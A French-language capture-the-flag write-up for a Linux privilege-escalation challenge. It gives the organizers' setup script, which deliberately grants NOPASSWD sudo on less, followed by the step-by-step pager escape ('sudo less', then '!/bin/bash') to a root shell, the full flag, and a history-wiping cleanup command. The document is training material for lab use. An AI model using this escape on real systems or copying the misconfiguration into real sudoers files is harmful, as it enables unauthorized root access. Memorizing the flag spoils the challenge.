# Write-up — Less Is Root
**CryptAbyss CTF 2026 | Catégorie : Linux Privilege Escalation**

---

## Informations du challenge

| Champ | Détail |
|---|---|
| Nom | Less Is Root |
| Vaisseau | PHANTOM-4 |
| Technique | Sudo Escape via GTFOBins (`less`) |
| CVSS | N/A — Mauvaise configuration |
| Difficulté | Facile |
| Catégorie | System |
| Auteur | Jeffrey JOANNEN / System |

---

## Description

> L'équipe SecOps de PHANTOM-4 a accordé à `operative` un droit sudo très restreint, juste assez pour consulter des logs volumineux sans déranger personne. « Ce n'est qu'un lecteur de fichiers, il ne peut rien modifier » a écrit l'administrateur. Il avait tort.
>
> Un secret de root vous attend dans `/root/flag.txt`.

**Accès fourni :**
```
User : operative
Pass : ph4nt0m-infiltrate
```

---

## Mise en place de l'environnement (organisateurs)

### Création de l'utilisateur, du flag et de la faille

```bash
# Utilisateur joueur
useradd -m -s /bin/bash operative
echo "operative:ph4nt0m-infiltrate" | chpasswd

# Flag final (root uniquement)
echo "CryptAbyss{SU20_L355_35C4P3_V4L1D4T3D}" > /root/flag.txt
chmod 400 /root/flag.txt
chown root:root /root/flag.txt

# Application de la faille : sudo NOPASSWD restreint sur less
LESS_BIN=$(which less)
cat > /etc/sudoers.d/phantom4_vulnerability << EOF
# Configuration de maintenance temporaire - PHANTOM-4
operative ALL=(ALL) NOPASSWD: $LESS_BIN
EOF
chmod 440 /etc/sudoers.d/phantom4_vulnerability

# Lore : seul indice pour le joueur
cat > /home/operative/.phantom_logs.txt << 'ANOMALY'
[ JOURNAL DE BORD INTERNE — VAISSEAU PHANTOM-4 ]

Cycle 2094.22 — Rapport SecOps :
  L'operateur 'operative' a recu des accès restreints
  pour analyser les logs système volumineux sans solliciter
  l'equipe de securite à chaque debogage.

  La commande ******** de ***** standard lui a ete
  accordee avec des privileges elevés sans demande de *******.

  Note de l'administrateur :
  "Ce n'est qu'un *********, il ne peut rien modifier,
   le risque est nul."

[ FIN DU RAPPORT — ERREUR CRITIQUE DE JUGEMENT ]
ANOMALY
chown operative:operative /home/operative/.phantom_logs.txt
chmod 600 /home/operative/.phantom_logs.txt
```

Vérification :
```bash
sudo -l -U operative
# (ALL) NOPASSWD: /usr/bin/less

cat /root/flag.txt
# accessible uniquement en root
```

---

## Write-up — Résolution pas à pas

### Étape 1 — Connexion et reconnaissance initiale

```bash
id
# uid=1001(operative) gid=1001(operative) groups=1001(operative)

sudo -l
# Matching Defaults entries for operative on phantom-4:
#     ...
# User operative may run the following commands on phantom-4:
#     (ALL) NOPASSWD: /usr/bin/less
```

Un droit sudo très ciblé : `operative` peut lancer `less` en root, sans mot de passe. On lit le lore pour confirmer :

```bash
cat ~/.phantom_logs.txt
# → "La commande [less] de [pager] standard lui a ete accordee avec
#    des privileges elevés sans demande de mot de passe."
# → "Ce n'est qu'un [lecteur], il ne peut rien modifier, le risque est nul."
```

### Étape 2 — Identification de la surface d'attaque

`less` n'est a priori qu'un visualiseur de fichiers — mais c'est justement ce qui en fait un vecteur d'escalade classique : comme `more` ou `vi`, il hérite d'une fonctionnalité historique permettant d'exécuter une commande shell sans quitter le pager.

> Ressource utile : [GTFOBins — less](https://gtfobins.github.io/gtfobins/less/) (entrée `sudo`)

### Étape 3 — Compréhension de la vulnérabilité

`less` autorise l'exécution de commandes externes via la syntaxe `!commande`, héritée des pagers de type `vi`/`more`. Lorsqu'il est lancé via `sudo`, cette commande externe hérite des privilèges de `sudo` — donc de root.

```
sudo (less)  →  processus less lancé en root
     ↓ touche '!'
     →  invite shell interne au pager
     ↓ "/bin/bash"
     →  exécution d'un shell héritant des privilèges du pager (root)
```

### Étape 4 — Exploitation

```bash
sudo less /etc/profile
```

Une fois `less` ouvert, on tape :

```
!/bin/bash
```

Un shell s'ouvre, héritant des privilèges root de `less`.

### Étape 5 — Obtention du flag

```bash
whoami
# root

cat /root/flag.txt
```

**Flag :** `CryptAbyss{SU20_L355_35C4P3_V4L1D4T3D}`

---

## Résumé de l'attaque

```
operative (uid=1001)
    ↓ sudo -l → NOPASSWD sur /usr/bin/less
    ↓ cat ~/.phantom_logs.txt → confirmation du contexte
    ↓ sudo less /etc/profile
    ↓ !/bin/bash (échappement du pager)
root shell (uid=0)
    ↓ cat /root/flag.txt
CryptAbyss{SU20_L355_35C4P3_V4L1D4T3D}
```

---

## Nettoyage (post-CTF)

```bash
# Retirer le droit sudo accordé sur less
rm -f /etc/sudoers.d/phantom4_vulnerability

# Effacer l'historique
history -c && rm ~/.bash_history
```

---

## Flags

| Flag | Valeur |
|---|---|
| Final | `CryptAbyss{SU20_L355_35C4P3_V4L1D4T3D}` |

*(Pas de flag intermédiaire pour ce challenge.)*

---

## Références

- [GTFOBins — less](https://gtfobins.github.io/gtfobins/less/)
- [HackTricks — Sudo/Admin group](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid-commands)
